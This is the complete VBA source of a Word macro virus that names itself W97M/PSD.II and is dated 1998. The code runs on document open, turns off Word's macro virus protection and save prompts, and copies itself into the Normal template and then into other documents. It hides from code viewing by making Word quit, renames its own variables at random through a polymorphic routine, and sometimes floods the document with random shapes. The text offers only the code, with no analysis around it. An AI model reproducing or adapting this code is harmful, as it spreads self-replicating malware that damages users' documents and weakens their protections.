   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Private Sub Document_Open()
   Private Sub Document_Open()
   On Error Resume Next
   Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
   If Day(Now) = Minute(Now) Then
   Randomize: For TM3491 = 1 To (Int(Rnd * 70))
   ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
   Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
   Selection.ShapeRange.Fill.Visible = msoTrue
   Selection.ShapeRange.Fill.Solid: Next TM3491: End If
   UL9644 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
   DI771 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
   If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
   Set OK2648 = ActiveDocument.VBProject.VBComponents.Item(1)
   OL775 = True
   End If
   If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
   Set OK2648 = NormalTemplate.VBProject.VBComponents.Item(1)
   UE6878 = True
   Call VH9821_RV1023
   ActiveDocument.Saved = True
   End If
   If UE6878 <> True And OL775 <> True Then GoTo NP935
   If UE6878 = True Then OK2648.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, UL9644 - 1) & vbCr & "Sub ViewVBCode()" & vbCr & "Application.Quit SaveChanges:=wdDoNotSaveChanges" & vbCr & "End Sub")
   If OL775 = True Then OK2648.CodeModule.AddFromString ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, DI771 - 4))
   NP935:
   If DI771 <> 0 And UL9644 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
   ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
   ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
   ActiveDocument.Saved = True: End If
   End Sub 'W97M/PSD.II ...logically delicious! [(c)1998 ALT-F11 code hack]
   Private Function VH9821_RV1023()
   On Error Resume Next
   Randomize
   Dim r1(1 To 15) As String
   r1(1) = "RU3433": r1(2) = "DC2077": r1(3) = "AE9067": r1(4) = "MB1957": r1(5) = "RV1023": r1(6) = "UL9644"
   r1(7) = "DI771": r1(8) = "OL775":: r1(9) = "OK2648": r1(10) = "UE6878": r1(11) = "NP935": r1(12) = "VH9821": r1(13) = "RE6659": r1(14) = "PQ7662": r1(15) = "TM3491"
   For TM3491 = 1 To 15
   a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
   Call RV1023(a1, r1(TM3491))
   Next TM3491
   End Function 'VAMP v1.0 [thanks Vic!]
   Private Function RV1023(PQ7662, RE6659 As String)
   On Error Resume Next
   Dim RU3433 As Long: Dim DC2077 As Long: Dim AE9067 As Long: Dim MB1957 As Long
   With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
   RU3433 = 1: DC2077 = 1: AE9067 = .CountOfLines: MB1957 = Len(.Lines(.CountOfLines, 1))
   Do While .Find(RE6659, RU3433, DC2077, AE9067, MB1957, True)
   strline = .Lines(RU3433, 1)
   strline = Left(strline, DC2077 - 1) & PQ7662 & Mid(strline, MB1957)
   .replaceline RU3433, strline
   RU3433 = AE9067 + 1: DC2077 = 1:
   AE9067 = .CountOfLines
   MB1957 = Len(.Lines(.CountOfLines, 1))
   Loop
   End With
   End Function
